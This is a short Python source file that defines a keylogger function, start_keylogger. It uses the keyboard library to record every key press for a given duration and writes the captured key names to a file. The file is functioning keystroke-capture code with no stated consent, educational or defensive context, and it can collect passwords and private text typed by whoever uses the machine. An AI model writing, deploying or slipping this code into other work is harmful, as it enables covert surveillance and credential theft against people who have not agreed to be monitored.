import keyboard 
import time


        
        
def start_keylogger(duration, name):

    
    keys = []
    
    timer = time.time()
    
    while time.time() - timer < duration:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            keys.append(event.name)
            
            
    # save result 
    with open(name, "w") as f: 
        for key in keys:
            f.write(key + "\n")
            
        f.close()
        
